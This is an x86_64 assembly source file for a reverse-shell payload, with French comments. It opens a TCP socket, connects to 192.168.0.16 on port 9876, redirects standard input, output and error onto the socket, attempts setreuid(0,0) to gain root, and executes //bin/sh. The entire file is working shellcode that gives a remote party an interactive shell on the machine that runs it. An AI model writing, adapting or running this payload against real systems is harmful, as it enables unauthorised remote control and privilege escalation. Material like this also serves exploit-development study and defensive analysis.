; Reverse Shell in asm x86_64 Intel Arch.
; Connects but does not include bind syscall yet
; <+> Under the terms of the GPL v3 License.

BITS 64
GLOBAL _start
SECTION .text

_start:
	; FDS = socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
	push BYTE 0x29		; syscall 41 -> socket
	pop rax
	cdq			; met rdx a 0 (1 byte au lieu de 2)
	push BYTE 0x2		; famille PF_INET en 1er argument
	pop rdi
	push BYTE 0x1		; type de socket SOCK_STREAM en 2nd argument
	pop rsi
	syscall			; rax = descripteur de fichier de la socket ouverte

	; connect(FDS, {AF_INET, 9876, '192.168.0.16'}, 16)
	mov rdi,rax		; descripteur de fichier de la socket en 1er argument
;	push 0x0100007f		; 127.0.0.1
	push 0x1000a8c0		; adresse distante = 192.168.0.16 little endian
	push WORD 0x9426	; port = 9876 little endian
	push WORD 0x2
	mov rsi,rsp		; on place l'adresse (rsp) du tableau en 2nd argument
	push BYTE 0x10		; longueur (en octet) de la structure du serveur
	pop rdx
	mov BYTE al,0x2A	; syscall 42 -> connect
	syscall

	; while i > -1 : dup2(FDS, --i)
	; 2 -> stderr
	; 1 -> stdout
	; 0 -> stdin
	xor eax,eax
	push BYTE 0x2
	pop rsi
	dup_loop:
	   mov BYTE al,0x21	; syscall 33 -> dup2
	   syscall
	   dec sil		; on decremente le 2nd argument
	   jns dup_loop		; si SF (sil > -1) n'est pas en position, on reboucle


; NON AUTORISE NATIVEMENT	; setreuid(0,0)
	push BYTE 0x71
	pop rax
	xor edi,edi
	xor esi,esi
	syscall

	; execve('//bin/sh', NULL, NULL)
	xor eax,eax
	xor esi,esi
	push rsi
	mov rdi,0x68732f6e69622f2f	; '//bin/sh' en 1er argument little endian
	push rdi
	mov rdi,rsp
	xor edx,edx		; 0 pour envp
	mov BYTE al,0x3b	; syscall 59 -> execve
	syscall

;----------------------------------------------------------
